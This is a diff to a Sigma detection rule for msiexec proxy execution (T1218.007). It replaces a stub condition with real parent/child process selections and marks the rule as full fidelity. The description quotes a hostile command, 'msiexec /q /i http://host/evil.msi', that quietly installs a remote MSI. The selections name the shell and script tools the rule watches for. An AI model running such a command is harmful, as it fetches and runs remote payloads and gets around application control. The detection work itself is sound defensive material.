@@ -3,7 +3,7 @@
 title: 'T1218.007 - Msiexec: Remote and Malicious MSI Proxy Execution (msiexec with Office/script parent (delivery chain) or spa'
 id: e7c19cac-d3cb-53ab-b7dc-7bfe5a2b7dab
 status: experimental
-description: 'Abusing msiexec.exe to install a malicious or remote MSI (msiexec /q /i http://host/evil.msi) or to load a malicious DLL through a custom action or the /y switch, executing payloads under the signed Windows Installer and bypassing application control that trusts msiexec Query block: msiexec with Office/script parent (delivery chain) or spawning shell. NOTE: no machine-translatable query logic (relies on aggregation, statistical baselining, or an external analytics layer). This rule is a documentation stub - see the tonk section for the original hunt logic.'
+description: 'Abusing msiexec.exe to install a malicious or remote MSI (msiexec /q /i http://host/evil.msi) or to load a malicious DLL through a custom action or the /y switch, executing payloads under the signed Windows Installer and bypassing application control that trusts msiexec Query block: msiexec with Office/script parent (delivery chain) or spawning shell.'
 author: TONK Hunt Reference (6b74.dev)
 date: 2026/07/21
 tags:
@@ -17,14 +17,25 @@ logsource:
     category: process_creation
     product: windows
 detection:
-    selection:
-        EventID|exists: true
-    condition: selection and not selection
+    selection_0:
+        process.name: msiexec.exe
+        process.parent.name:
+            - winword.exe
+            - outlook.exe
+            - mshta.exe
+            - powershell.exe
+    selection_1:
+        process.parent.name: msiexec.exe
+        process.name:
+            - cmd.exe
+            - powershell.exe
+            - rundll32.exe
+    condition: selection_0 or selection_1
 falsepositives:
     - Unknown - baseline before enabling
 level: medium
 tonk:
-    fidelity: metadata
+    fidelity: full
     source_file: host/js/data/defense_evasion.js
     domain: host
     technique: T1218.007
@@ -210,8 +221,6 @@ tonk:
           criminal (FIN7) operators, many commodity loaders, and numerous
           ransomware precursors distribute payloads as MSIs run through
           msiexec, frequently fetched from a remote URL.
-    dropped_clauses:
-        - 'unparsed: (process.name: "msiexec.exe" AND process.parent.name: ("winword.exe" OR "outlook.exe" OR "mshta.exe" OR "powershell.exe"'
     actors:
         - Lazarus
         - APT41
